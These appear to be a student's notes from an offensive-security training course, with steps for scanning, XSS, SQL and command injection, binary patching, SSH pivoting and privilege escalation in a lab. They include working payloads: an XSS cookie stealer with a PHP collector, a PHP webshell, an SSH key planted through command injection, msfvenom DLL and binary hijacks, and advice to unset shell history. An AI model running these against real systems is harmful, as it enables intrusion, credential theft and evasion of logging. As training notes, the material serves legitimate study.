@@ -1,0 +1,754 @@
+############DAY 1###################
+
+scraping data
+  pip install lxml requests
+  #!/usr/bin/python
+  import lxml.html
+  import requests
+  
+  page = requests.get('http://quotes.toscrape.com')
+  tree = lxml.html.fromstring(page.content)
+  
+  authors = tree.xpath('//small[@class="author"]/text()')
+  
+  print ('Authors: ',authors)
+  #end of script
+  
+  quad zeros and port to specify tunneled website. port 80
+  
+Advanced Scanning Techniques
+1. HOST DISCOVERY
+  find hosts that are online
+2. HOST ENUMERATION
+  find ports for each host that is online (21-25,80)
+3. HOST INTERROGATION
+  find what service is running on each open/available port (banner grab with netcat, and try another)
+  
+Network Scanning commands
+(ping sweep best for ip/cidr)
+(nmap best for single targets)
+for i in {1..254}; do (ping -c 1 192.168.1.$i | grep "bytes from" &); done #ran from machine closest to the network I want to scan
+nmap -Pn -T4 <ip> -p 21-25,80,8080,8888,2222,4444
+nc ip and open ports
+#addons for nmap
+--script=banner.nse
+--script=http-enum.nse #finds commonly used directories
+--script=smb-os-discovery.nse #help find info if windows is running ports 139 or 445
+
+script management
+/usr/share/nmap/scripts
+examples
+nmap --script <filename>|<category>|<directory>
+nmap --script-help "ftp-* and discovery"
+nmap --script-args <args>
+nmap --script-args-file <filename>
+nmap --script-help <filename>|<category>|<directory>
+nmap --script-trace
+
+"4.15.0-76-generic" AND "vulnerability" OR "exploit" #Google search example
+CVE is good website for vulnerability research
+MITRE or exploit-db is good for exploit reasearch
+
+__________________________________________________________________________________________________________
+###DAY 2####
+
+### Web Exploitation ###
+
+HTTP (GET, POST, HEAD, PUT)
+  tools to look at HTTP GET
+    tcpdump, wireshark, developer console 
+    
+HTTP Response Codes
+10X == informational
+2XX == success
+30X == redirection
+4XX == Client Error
+5XX == Server Error
+
+HTTP Fields
+  User-Agent
+  Referer
+  Cookie
+  Date
+  Server
+  Set-Cookie
+  
+page source, look into network tab (F12) 
+websiets/robots.txt #contains some additional information
+
+Wget
+  Recursively download
+  Recover from broken transfers
+  SSL/TLS support
+wget -r -l2 -P /tmp ftp://ftpserver/  
+wget --save-cookies cookies.txt --keep-session-cookies --post-data 'user=1&password=2' https://website
+wget --load-cookies cookies.txt -p https://website/interesting/article.php
+
+cURL
+  not recursive
+  can use pipes
+  upload ability
+  supports more protocols vs WGET, such as SCP & POP#
+curl -o stuff.html https://web.site/stuff.html
+curl 'https://web.site/submit.php' -H 'Cookie: name=123; settings=1,2,3,4,5,6,7' --data 'name=Stan' | base64 -d > item.png
+
+JavaScript
+  allows websies to interact with the client
+  javascript runs on clients machine
+  coded as .JS files, or in-line of HTML
+
+enumeration
+  ROBOTS.TXT
+  httpenum nse script
+  Nikto
+  Burp Suite (outside class)
+  
+Cross-Site scripting (XSS) Overview
+  Reflected XSS - Most common (such as link in emails)
+  Stored XSS - resides on Vulnerable Site
+  
+Useful JavaScript components
+  document.cookie
+  document.body.innerHTML
+  keydown and keyup
+  <script>alert('XSS');</script> #put into searchbar on physical webpage
+
+Command Injection
+  application on the server is vulnerable, allowing execution of arbitrary commands
+  user input not validated
+    common example is a SOHO router, with a web page to allow ping
+    (might comtain the following in its code: system("ping -c 1 ".$_GET["ip"]);)
+      run the following to chain/stack our arbitrary command
+      (; cat /etc/passwd)
+      
+### EXAMPLES ###
+nmap --script http-enum.nse <ip> -p 80
+or
+nikto -host <ip> 
+or
+.php on websites
+   <script>alert('XSS');</script> #this becomes embbedded into the page, anyone else traveling to site will see the popup message for the vulnerability
+   
+COOKIE STEALING PHP
+http://10.50.20.179:8000/ cookie STEALING note page 
+   <script>/home/student/cookies="http://<myopstation>10.50.34.188:8000/"+document.cookie;</script>
+   run this on your opstation:
+    python3 -m http.server
+   while the python command is running, past the top script into the websites php, title, then put in body of message
+robots.txt should have upload enabled. go to website /uploads to see uploaded file. chat/messageb.php
+/var/www/html/uploads
+script to upload
+cookie_stealer.php
+<?php
+$cookie = $_GET["username"];
+$steal = fopen("/var/www/html/uploads/cookiefile.txt", "a+");
+fwrite($steal, $cookie ."\n");
+fclose($steal);
+?>
+<script>document.location="http://theServer<IP>/uploads/cookie_stealer.php?username="+document.cookie;</script> #performs local cookie stealing
+
+WEBSHELL PHP
+<HTML><BODY>
+<FORM METHOD="GET" NAME="myform" ACTION="">
+<INPUT TYPE="text" NAME="cmd">
+<INPUT TYPE="submit" VALUE="Send">
+</FORM>
+<pre>
+<?php
+if($_GET['cmd'])
+  system($_GET['cmd']);
+  }
+?>
+</pre>
+</BODY></HTML>
+
+COMMAND INJECTION #### VERY IMPORTANT OR WE WILL FAIL ### COMES AFTER WEBSHELL PHP IS UPLOADED
+website/cmdinjection
+; <- add this into the cmdinjection to run commands after the ping
+view page source for cleaner view of output
+look for www-data /var/www is home directory
+generate rsa key on linops
+ssh-keygen -t rsa -b 4096
+enter all info as blank
+cd /home/student/.ssh
+cat id_rsa.pub copy key from ssh-rsa upto the == signs 
+;ls -la on cmd injection
+if no .ssh do ;mkdir /var/www/.ssh
+;ls -la /var/www
+;echo "paste in public key" > /var/www/.ssh/authorized_keys
+;ls -la /var/www/.ssh/
+;cat /var/www/.ssh/authorized_keys
+on linops ssh -i .ssh/id_rsa <user>@<ip> #user where the publickey was entered into
+
+
+
+
+
+Scheme of Maneuver:
+>Jump Box
+-->T1:10.100.28.40
+
+Target Section:
+
+T1
+Hostname: Donovian_MI_websvr
+IP: 10.100.28.40
+OS: unknown
+Creds:unknown
+Last Known SSH Port: unknown
+PSP: Unknown
+Malware: Unknown
+Action: Conduct approved Web Exploitation techniques to collect intellegence.'
+
+
+_____________________________________________________________________________________________________
+#### DAY3#####
+
+Web Exploitation 2 (SQL)
+
+SQL 
+  Structured Query Language - ANSI Standard
+
+#COMMANDS#
+SELECT ### Primary Focus
+  Extracts data from a database
+UNION ### Primary Focus
+  Used to combine the result-set of two or more SELECT statements
+USE ### Primary Focus
+  Selects the DB to use
+UPDATE
+  Updates data in a database
+DELETE
+  Deletes data from a database
+INSERT INTO
+  Inserts new data into a database
+CREATE DATABASE
+  Creates a new database
+ALTER DATABASE
+  Modifies a database
+CREATE TABLE
+  Creates a new table
+ALTER TABLE
+  Modifies a table
+DROP TABLE
+  Deletes a table
+CREATE INDEX
+  Creates an index (search key)
+DROP INDEX
+  Deletes an index
+  
+EXAMPLE #these commands are completed on server side
+mysql
+  show database; #all commands end with semi-colon
+  show tables from session(database name);
+  SELECT * from session.Tires(field within database);
+  SELECT tireid,name,cost(columns within session.tires) from session.Tires;
+  
+  use session #its like changing a directory
+  SELECT * from Tires;
+
+SQLBOLT.com is great for practice
+  
+SQL Injection Considerations
+  is INFORMATION_SCHEMA data base available
+  GET requests versus POST request HTTP methods
+  input field sanitation
+    unsanitized fields can be round using a single quote '
+    will return extraneous information
+    ' closes a variable, to allow for additional statements/clauses
+    may show no errors or generic error (harder injection)
+  sanitized input fields are checked for items that might harm the database (items are removed, escaped, or turned into a single string
+  validation: checks inputs to ensure it meets a critera (string doesnt contain ')
+
+Server-Side Query Processing
+  user enters JOHNDOE243 in the name form field and PAS1234$ in the pass form field
+    the server side query that would be passed to MySQL from PHP would be 
+      before input
+        SELECT id FROM users WHERE name='$name' AND pass='$pass';
+      after input
+        SELECT id FROM users WHERE name='JohnDoe243' AND pass='pass1234';
+  
+ Injecting Your Statement
+  user enters TOM'OR 1='1 in the name and pass fields
+    Truth Statement: tom'OR 1='1
+  server-side query executed would appear like this:
+    SELECT id FROM users WHERE name='tom' OR ='1 AND pass='tom' OR 1='1'
+    
+EXAMPLE ###
+Russian Username and password login fields
+run f12 developer tools
+type in a user(admin) and password(admin) while in developer tools network field to view GET request
+User'OR '1=1
+User'OR '1=1
+help us find out which filed is vulnerable
+in networking, look at http request field, switch to raw. Copy and paste that information into the webaddress 
+login.php?username=tom&passwd=tom'or'1  
+
+
+#can test things out on 10.50.42.112/Union.html
+
+Test POST Method
+entering into a field is POST
+see how website normally operate, interact and fill in info
+shows name='Ford'
+now input Ford' OR '1=1 (didnt work)
+try Ford' OR 1='1 (didnt work)
+try doing a different item
+Audi' OR '1=1 (worked)
+
+test GET Method
+pick a target press get and interact
+notice the address field
+http://10.50.42.112/uniondemo.php?Selection=1&Submit=Submit
+http://10.50.42.112/uniondemo.php?Selection=1 or 1=1 (didnt work)
+http://10.50.42.112/uniondemo.php?Selection=2 or 1=1 (worked) shows sql injection
+http://10.50.42.112/uniondemo.php?Selection=3 or 1=1 (worked)
+acknowledge how many fields we have in table
+http://10.50.42.112/uniondemo.php?Selection=2 UNION select 1,2,3 # (next step after you find out which ones worked)
+now we quary information schema
+Selection=2 UNION select table_schema, table_name, column_name from information_schema.columns # UNION select 1,2,3,4,5,6,7
+http://10.50.42.112/uniondemo.php?Selection=2 UNION select table_schema,table_name,column_name from information_schema.columns
+websites column were displayed out of order. fix the order
+http://10.50.42.112/uniondemo.php?Selection=2 UNION select table_schema,column_name,table_name from information_schema.columns
+
+
+SQL By The Numbers
+1. browser the website as normal and find input fields plus vulnerabilities
+2. test each field, GET and/or Post ('or 1='1)
+3. find total # of columns (union 1,2,3...)
+4. Golden Statement
+  union select ..,..,..,.. from Information_Schema.columns;#
+5. Naviage to custom databases
+  what are the 3 default
+6. make new query based on custom tables+columns
+  union select ..,..,.. from customtable.(customcolumn;#
+7. ???
+8. profit
+
+
+Scheme of Maneuver:
+>Jump Box
+->T1:10.100.28.48
+
+Target Section:
+
+T1
+Hostname: donovian-nla
+IP: 10.100.28.48
+OS: unknown
+Creds:unknown
+Last Known SSH Port: unknown
+Last Known HTTP Port: 80
+PSP: Unknown
+Malware: Unknown
+Action: Conduct approved SQLi Exploitation techniques to collect intelligence.
+_______________________________________________________________________________________________
+####DAY4#########
+
+### REVERSE ENGINEERING ### more or less malware analysis for the mod
+
+X86_64 Assembly
+
+genereal purpose registers
+
+r = 64 bit
+e = 32 bit
+nothing = 16 bit
+
+%rax = the first return register
+%rbp = the base pointer that keeps track of the base of the stack
+%rsp = the stack pointer that points to the top of the stack
+
+arguments will be passed to functions similar to [%ebp-0x8]
+
+#HEAP = memory that can be allocated and deallocated (dynamic)
+#STACK = a contiguous section of memory used for passing arguments (PEZ Dispenser)
+GENERAL REGISTER = a multipurpose register that can be used by either programmer or used to store data or a memory location address
+CONTROL REGISTER = a process register that changes or controls the behavior of a CPU
+FLAGS REGISTER = contains the current state of the processor
+
+Memory-Offset
+Instruction Pointer REgister points to the memory offset of the next instruction in the code segment
+
+64-bit  Lower 32 bits Lower 16 bits Description
+RIP     EIP           IP            Instruction pointer; holds address for next instruction to be executed
+
+Common Instruction Pointers
+  MOV
+    move source to destination
+  PUSH
+    push source onto stack
+  POP
+    Pop top of stack to destination
+  INC
+    Increment source by 1
+  DEC
+    Decrement source by 1
+  ADD
+    Add source to destination
+  SUB
+    Subtract source from destination
+  CMP
+    Compare 2 values by subtracting them and setting the %RFLAGS register. ZeroFlag set means they are the same. (subtracts the values from eachother)
+  JMP
+    Jump to specified location
+  JLE
+    Jump if less than or equal
+  JE
+    Jump if equal
+    
+ Reverse Engineering Workflow (software)
+ Static
+ Behavioral
+ Dynamic
+ Disassembly
+ Document Findings
+ 
+ use file to see what the files are
+ pull out plaintext strings on the file using the strings command
+ behavioral analysis, try out the malware, interact with it before throwing into gidra or ida
+ document everything with opnotes
+ 
+ portable executable patching/software analysis
+  perform DEBUGGING and DISASSEMBLY
+  find the SUCCESS/FAILURE
+  adjust INSTRUCTIONS
+  apply patch and save
+  execute patched binary
+ 
+EXERCISE
+Log into lin ops. 
+open up firefox
+loginto CTFD
+download malwares
+file command the malware to determine what it is
+download onto windows opstation while logged in with xfreerdp. use chrome.
+double click the executable and note what it does.
+drag the malware into IDA and run it. ida is used primarily for malware analysis this mod.
+search the program with keywords from its previous interaction to find a starting point.
+click view, open subviews, strings
+ctrl f for the keywords. double click the string. takes you to where that string is stored in the assembly.
+we want to make the malware say success.
+double click on the sub function on the line where it says success.
+read everything from bottom to top for reverse engineering. look at the command right above the split.
+jnz always has a compare statement with it. 
+left click the alpha-numeric on the compare above jnz. press h while it is highlighted. look at eax number. now find where eax gets assigned its value.
+call can potentially reassign eax. looking for eax or call. double click on sub. click on eax and press h. 
+we see the program ends up being user input with ecx of 123 and a user input. run the malware and user input 123. Success!!
+now run the program in Ghidra to see the results as well. Do not drag program into Ghidra, just open Ghidra.
+file, new project, call it whatever you want. click the folder. press the dragon. wait for next window.
+press file, import file, select the malware and import it. press ok. yes analyze.
+find the previous keyword used with ctrl f in ida, but now performed in Ghidra. go to search tab. for strings. leave default. 
+takes you to the string window. use the filter bar. double click the keyword. find the success. look for the XREF. double click the code next to xref.
+takes you to pseudo code. look for condition. show variable with hex. right click hex and change it to decimal. can rightclick variable and rename it(aka vwinning)
+look for more of that variable. shows a function, double click on function to go to it. make all hex a decimal. find new variable and rename it to set_var.
+shows a number under param(1) for user input that a variable needs set to get the success variable. use the number in the set_var as new input on malware
+to print out success.
+
+
+Situation:
+Various teams have extracted binaries from Donovian development networks. Analyze the given binaries to find weaknesses and create signatures.
+
+Provided:
+compiled executable: (entry.exe)
+source code: (entry.c)
+Task: Run the executable with expected input and retrieve success message.
+Method: disassemble the executable and follow the program’s execution to discover its functionality, and expected input.
+
+Ensure that before you move on from this challenge that you have fully understood what you have done to disassemble and reverse engineer this binary and how it is related to the provided source code.
+
+What is the key for this binary?
+
+
+Prior Approvals:All files can be extracted from the known target "Donovian-Webserver". Only authorized to conduct task on Analyst Workstations.
+
+T1
+Hostname: web.site.donovia
+IP: 192.168.28.111
+OS: unknown
+Creds: comrade::StudentWebExploitPassword
+Last Known SSH Port: unknown
+PSP: Unknown
+Malware: Unknown
+Action: Extract approved binaries under directory titled "longTermStorage".
+
+
+____________________________________________________________________________
+DAY 5
+
+
+PATCHING
+
+"enter a random key" 
+it fails
+we will make this succeed everytime with a patch using IDA or Ghidra
+
+open ida
+search
+strings
+find enter key
+double click into it
+double click sub function
+edit, patch program, assemble
+if jnz switch to jg (jump if greater)
+edit patch program, apply patches to input file
+bottom should say applied patches
+retest program
+
+open ghidra
+import the file
+follow steps to the function
+look for the JNZ for success
+right click the jnz and press patch instruction
+change to JG, press Enter
+export program, change to PE
+test the program
+
+____________________________________________________
+DAY  6 
+PATCHING
+
+"enter a random key" 
+it fails
+we will make this succeed everytime with a patch using IDA or Ghidra
+
+open ida
+search
+strings
+find enter key
+double click into it
+double click sub function
+edit, patch program, assemble
+if jnz switch to jg (jump if greater)
+edit patch program, apply patches to input file
+bottom should say applied patches
+retest program
+
+open ghidra
+import the file
+follow steps to the function
+look for the JNZ for success
+right click the jnz and press patch instruction
+change to JG, press Enter
+export program, change to PE
+test the program
+
+
+----------------------------------------------------
+DAY 7
+
+
+Gray Host: 10.50.35.125
+PW: password
+win_ops 	
+192.168.65.10, 10.50.39.83  
+linux_ops
+192.168.65.20, 10.50.34.188
+xfreerdp /v:10.50.39.83 /u:student /p:password /size:1920x1000 +clipboard
+
+POST Exploitation
+
+Once you are on the box
+always enumerating
+
+### LINUX ###
+
+cat /etc/passwd
+cat /etc/shadow
+
+last #show information about last user logged on, or who could be currently logged on
+who #see who is currently logged on
+whoami #shows who you are logged in as
+groups #show all the groups of currently logged in user
+id #show group id of user who ran the command
+
+ps -elf
+ps -auxf
+pstree
+sudo lsof #list of open files
+ps -p 1 #shows us if we are systemd or sysv
+systemctl list-units --type service #systemd command 
+systemctl list-units --type=service | grep running 
+service --status all or chkconfig #sysv
+
+ifconfig -a #notice the MTU as it is important for sending packets across a network
+netstat #show open connections
+arp -an 
+ip route #routing table
+netstat -r #routing table
+route #routing table
+cat /proc/cpuinfo
+lsmod #list kernel modules
+
+data xfil: pulling data back and doing it securely by encrypting or putting on a cipher
+
+
+### WINDOWS ###
+
+net user #show users on the box
+get-localuser #ps
+get-localgroup
+get-localuser | get-member
+get-localuser | select name
+
+tasklist /v #all running processes
+get-process 
+get-process | where {$_.sessionid -eq 1}
+get-process | where-object {$_.ID -lt '1000'}
+tasklist /svc #gets services
+net start #started services
+get-service | where {$_.status -eq "running"}
+
+ipconfig /all
+netstat -anob #local listening ports, pid, binary
+net use #show ocnnections
+net view #show servers fork workgroup
+arp /a
+route print
+systeminfo #os,bios,domain information
+date #see what timezone they are in or there systems running in
+
+data xfil / obfuscation : same as linux (we generally will be using scp)
+
+### SSH MULTIPLEXING / CONTROL SOCKETS ###
+better version of SSh
+ls -lisa #check to see if you have a hidden .ssh folder in /student/home directory
+cd into .ssh directory
+mkdir cm #control masters
+cd cm
+#set up master socket with your first jump/pivot or the box that can see many hosts, can keep making mroe of these
+on linops:/.ssh/cm: ssh -M -S ~/.ssh/cm/gray student@10.50.35.125 #creates master socket
+on linops:/.ssh/cm: ssh -S ~/.ssh/cm/gray gray #logs you into the box without need of authentication
+
+on linops:/.ssh/cm: ssh -M -S ~/.ssh/cm/gray -o "ControlPersist=10m" student@10.50.35.125 #if no connections for 10 minutes, will delete the connection
+on linops:/.ssh/cm: ssh -S ~/.ssh/cm/gray gray
+on linops:/.ssh/cm: ssh -O forward#portforward -L1111:10.100.28.48:80 -S ~/.ssh/cm/gray nla 
+on linops:/.ssh/cm: ssh -O forward -L2222:10.100.28.40:80 -S ~/.ssh/cm/gray another
+go to firefox type in 0.0.0.0:1111
+nc 0.0.0.0 1111
+nc 0.0.0.0 2222
+on linops:/.ssh/cm: ssh -O cancel -L2222:10.100.28.40:80 -S ~/.ssh/cm/gray another #will close the connection
+on linops:/.ssh/cm: ssh -O cancel -S ~/.ssh/cm/gray nla #gracefully shutdown socket
+on linops:/.ssh/cm: ssh -O exit -S ~/.ssh/cm/gray #tear down all connections
+
+on linops: ssh -O forward -L3333:192.168.28.111:2222 -S ~/.ssh/cm/gray comrade #preparing to make a second master socket
+ssh -M -S ~/.ssh/cm/T1 comrade@0.0.0.0 -p3333
+
+
+----------------------------------------------------------------------------------
+DAY 8
+
+Linux Exploitation
+escalate privileges in linux environment
+
+Privilege Escalation
+
+sudo -L #very important
+find / -type f -perm /4000 -ls 2>/dev/null #find suid bits set
+find / -type f -perm /2000 -ls 2>/dev/null #find guid bits set
+find / -type f -perm /6000 -ls 2>/dev/null #find both suid and guid bits set
+
+GTFOBins #type in the commands you see you can use under sudo -l
+copy the sudo command and paste it into command prompt
+look at the at command
+try all of the /usr/bin/"commands" in GTFOBins, just copy and paste commandscd 
+check out the cron tab
+crontab -l
+check out tmp and /var/tmp
+use which command to find binaries # which ls as an example
+$PATH to see the paths 
+PATH=.$PATH #dont do this
+vim ls
+chmod +x ls
+#! /bin/bash
+echo "this is not the real LS"
+/bin/ls -l #to run the real ls command
+cd
+/bin/ls /etc/crontab
+/bin/etc/cron.hourly/
+adding or hijacking a user account:
+unset HISTFILE for tradecraft
+SystemD is important to be aware of for init system, determines the logging structure
+ausearch -p 22 or ausearch -m USER_LOGIN -sv no or ausearch -ua edwards -ts yestearday -te now -i
+journalctl _TRANSPORT=audit
+logs typically stored in /var/log: useful logs are auth.log/secure(logins/authentications), lastlog(each users last successful login, 
+btmp(bad login attempts), sulog(usage of su command), utmp(currently logged in), wtmp(user logon logoff)
+
+ -------------------------------------------------------------------------------------------------------------
+ 
+DAY 9
+ Windows Privilege Escalation
+
+Windows Access Control Model
+  Access Tokens
+    SID
+  Security Descriptors
+    DACL
+    SACL
+    ACEs
+    
+DLL Serach Order
+  executables check the following locations in successive order
+    HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
+    The directory the the Application was run from
+    The directory specified in in the C+ function GetSystemDirectory()
+    The directory specified in the C+ function GetWindowsDirectory()
+    The current directory
+    
+privilege esc###
+  look at scheduled tasks
+  registry run keys, HKLM and CurrentUser
+  Powershell Profiles
+  
+Powerful Commands for DLL Hijacking ###
+  query tasks with powershell
+  schtasks /query /fo LIST /v | select-string -pattern "Task" | select-string -Pattern "COM handler" -NotMatch
+    or look at scheduled tasks in GUI, or use autoruns.exe sysinternals tool 
+    or look at services gui(look at emptry description or bootleg and running as local system)(starts auto)(double click, go to path executable)
+  icacls "C:\Users\student\exercise_2\" #shows permissions of that location
+  # net use * http://live.sysinternals.com
+  # cd Z:\
+  # .\procmon -accepteula
+  # -process name is puty.exe include
+    -result is NAME NOT FOUND include
+    -path contains .dll include
+  pick a .dll that is in the location we found to have writable permissions
+  on windows make a file called whoami.txt on the Desktop
+  linops: msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\\Users\\DemoAdmin\\Desktop\\whoami.txt' -f dll > WINMM.dll
+  Windows: cd C:\
+           scp student@linops:/home/student/WINMM.dll C:\Users\student\exercise_2\
+
+Powerful Commands ###           
+  look at services gui(look at emptry description or bootleg and running as local system)(starts auto)(double click, go to path executable)           
+  icacls "C:\Program Files\7-Zip\7.exe"
+  cd 7-Zip
+  copy 7z.exe 7z.bk.exe
+  linops: msvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\\Users\\DemoAdmin\\Desktop\\whoami.txt' -f exe > 7z.exe
+  windows: scp student@linops:/home/student/7z.eze 'C:\Program Files\7-zip'
+  service was hanging up so start the service again manually if need be
+
+Powerful Commands UAC ###
+  registry run keys, HKLM and CurrentUser
+  can look at these with .\autoruns.exe or regedit
+  auditpol /get /category:*
+  auditpol /get /category:* | findstr /i "success failure"
+  auditpol /list /subcategory:"detailed tracking","DS Access"
+  go to event viewer
+  look at windows logs
+  go to system logs
+  filter current logs
+  critical warning verbose, click ok OR look at the event id
+  C:\Windows\System32\Config\
+  File type
+    .evtx
+    .evt
+  wevtutil el
+  wmic ntevent where logfile="<LOGNAME>" list full
+  get-eventlog -list
+  powershell: get-eventlog -logname security -newest 50 | format-list
+  reg query hklm\software\microsoft\powershell\1\powershellengine
+  get-host
+  reg query 'HKLM\System\currentcontrolset\session manager\knownDLLs'
+  
+ 
+ 
